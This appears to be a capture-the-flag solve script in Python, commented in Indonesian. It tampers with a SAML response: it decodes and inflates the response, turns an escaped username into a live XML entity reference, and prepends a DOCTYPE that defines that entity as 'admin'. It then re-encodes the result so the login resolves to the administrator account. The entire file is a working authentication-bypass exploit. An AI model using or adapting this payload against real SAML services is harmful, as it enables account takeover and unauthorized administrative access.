from base64 import b64decode, b64encode
import zlib
import urllib.parse
import sys

def main():
    if len(sys.argv) != 2:
        print("Usage: python solve.py <SAMLResponse>")
        sys.exit(1)

    # Argumen pertama: nilai parameter SAMLResponse (URL-encoded)
    samlResponse = sys.argv[1]

    # Nama entity harus match dengan username: ak&:160406;
    entityName = b":160406"

    # 1) URL-decode -> Base64-decode -> DEFLATE (raw) decompress
    url_decoded = urllib.parse.unquote(samlResponse)   # str
    compressed = b64decode(url_decoded)                # bytes
    xml = zlib.decompress(compressed, -15)             # bytes (raw DEFLATE)

    # 2) Ubah "ak&amp;:160406;" menjadi "ak&:160406;"
    xml_modified = xml.replace(
        b"&amp;" + entityName + b";",
        b"&" + entityName + b";"
    )

    # 3) Prepend DTD yang define entity :160406 sebagai "admin"
    dtd = b'<!DOCTYPE saml [<!ENTITY ' + entityName + b' "admin">]>'
    payload = dtd + xml_modified

    # 4) Compress lagi sebagai raw DEFLATE, lalu Base64, lalu URL-encode
    comp = zlib.compressobj(wbits=-15)
    compressed_new = comp.compress(payload) + comp.flush()
    b64_new = b64encode(compressed_new)  # bytes -> base64
    result = urllib.parse.quote(b64_new.decode())  # decode ke str dulu, BARU quote

    print(result)

if __name__ == "__main__":
    main()
